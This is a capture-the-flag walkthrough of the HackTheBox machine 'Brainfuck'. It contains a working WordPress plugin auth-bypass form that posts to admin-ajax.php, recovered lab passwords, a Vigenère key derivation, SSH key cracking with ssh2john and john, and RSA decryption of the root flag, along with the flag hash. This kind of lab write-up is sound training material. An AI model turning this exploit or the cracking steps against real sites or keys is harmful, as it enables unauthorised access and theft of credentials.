<h1 id="brainfuck">BrainFuck</h1>
<p>The BrainFuck was a nice quick box to go through on the hackthebox site. It was rated insane but it felt more like a medium box. The box had 2 virtual name servers which had two different sites. One was Wordpress and the other was text forum based on flarum. We had to exploit both the servers to gain SSH access to the box. The box also had an SMTP server that was not intended for exploitation but to merely interact. so let’s get started!</p>
<h2 id="nmap">Nmap</h2>
<p>we start with the Nmap scan, so see which all ports are open on the box.</p>

# Nmap done at Thu Mar 26 22:27:18 2020 -- 1 IP address (1 host up) scanned in 101.55 seconds</code></pre>
<p>The Nmap reveals some interesting ports such as 25 and 110 which are for SMTP <em>(Simple Mail Transfer Protocol)</em> and POP <em>(Post Office Protocol)</em> respectively. Since port 443 which https is also open let’s start with that as it has a wider attack surface.</p>
<h2 id="webpage-enumeration">WebPage Enumeration</h2>
<p>The webpage by default showed the Nginx default page. So let’s start with examing the SSL certificate for information such as usernames, email, domain name, etc. On examining the SSL certificate we found an email address and some DNS names</p>
<pre><code>E = orestis@brainfuck.htb
CN = brainfuck.htb
OU = IT
O = Brainfuck Ltd.
L = Athens
ST = Attica
C = GR
======================================
DNS Name: www.brainfuck.htb
DNS Name: sup3rs3cr3t.brainfuck.htb</code></pre>
<p>Now lets update our /etc/hosts file with these enteries and examine the webpage again. Now we find two different content manager running on the two dns names.</p>
<p>The www.brainfuck.htb has a WordPress running so we will use wpscan to examine it and the other has text forum which on some googling around revealed was running flarum. The text forum looks like it will require login credentials for further enumeration. Thus we will ignore it for now.</p>
<p>Examining the wordpress scan output we get a bunch of details.</p>

<p>we find that WordPress is vulnerable to the exploit https://www.exploit-db.com/exploits/41006 which will give the admin token with the password. Thus editing the exploit to suit our needs will giving us the following exploit code.</p>
<pre><code>&lt;form method=&quot;post&quot; action=&quot;http://www.brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;
    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;administrator&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;sth&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
&lt;/form&gt;</code></pre>
<p>Save it in a html file and open it with firefox and once done, go to wp-admin to view the dashboard. Enumerating the wordpress dashboard we find the smtp password. You view its value by using web browser’s tool and inspecting the value. We get the credentials as</p>
<pre><code>username: orestis@brainfuck.htb
password: kHGuERB29DNiNE</code></pre>
<h2 id="smtp-enumeration">SMTP Enumeration</h2>
<p>Since we SMTP credentials now let’s open the <strong>Blue Bird</strong> and login into the SMTP server. Login is fairly simple.</p>
<p>Just log in with username <strong>orestis</strong> and email as <strong>orestis@brainfuck.htb</strong> and password.</p>
<p>Once in we find an email talking about the credentials of the text forum we found earlier. We find the credentials as the following.</p>
<pre><code>username: orestis
password: kIEnnfEKJ#9UmdO</code></pre>
<h2 id="the-text-forum">The Text Forum</h2>
<p>Exploring the text forum we find them talking about the SSH Key in some sort of vignere encrypted key. Using Open Source tools such as dcode.fr does not work as we don’t know the key. But we have something that looks like a URL.</p>
<p>Since it is a URL and has 4 letters in the starting then it must start with https. Based on that we can derive a partial key, which in our case will be</p>
<pre><code>FUCKM</code></pre>
<p>Now using the dcode.fr we can derive the rest of the key. Enter this key in <strong>Knowing Partial Key</strong> section and paste the encrypted text. Thus we will rest of the key as:</p>
<pre><code>FUCKMYBRAIN</code></pre>
<p>Now since we know the Vignere key let’s get ssh key URL and download the key.</p>
<h2 id="getting-shell">Getting Shell</h2>
<p>Once we get the SSH key it is encrypted with some password. Using ssh2john to convert the key to a hash and then using john with the RockYou wordlist gets us the password.</p>
<pre><code>ssh2john id.rsa &gt; hash
john --wordlist=~/rockyou hash

password found: 3poulakia!
</code></pre>
<p>We use that password and boom! we are in. And can read the user.txt file</p>
<pre><code>cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9</code></pre>
<h2 id="privelege-escalation">Privelege Escalation</h2>
<p>In the home direcotry of the user <strong>orestis</strong> we find a file named encrypt.sage . On some enumeration, I found that it a scientific mathematical programming language that is used to calculations. But fortunately, it looks an RSA implementation and python can be used to decode the encrypted file.</p>
<pre><code>nbits = 1024password = open(&quot;/root/root.txt&quot;).read().strip()
enc_pass = open(&quot;output.txt&quot;,&quot;w&quot;)
debug = open(&quot;debug.txt&quot;,&quot;w&quot;)
m = Integer(int(password.encode(&#39;hex&#39;),16))p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)c = pow(m, e, n)
enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)
debug.write(str(p)+&#39;\n&#39;)
debug.write(str(q)+&#39;\n&#39;)
debug.write(str(e)+&#39;\n&#39;)
</code></pre>
<p>We have the things need to decode the RSA in debug file. So decoding the RSA encrypted text it should give us the root.txt file hash.</p>
<p>I wrote a script in python that will help us to decode this RSA encryption.</p>

<p>Thus this gives the root.txt hash. I tired to get the root shell but it was not intended and i did’nt find any reliable path.</p>
<p>Thus this was the box and will upload other linux OSCP boxes later.</p></body>
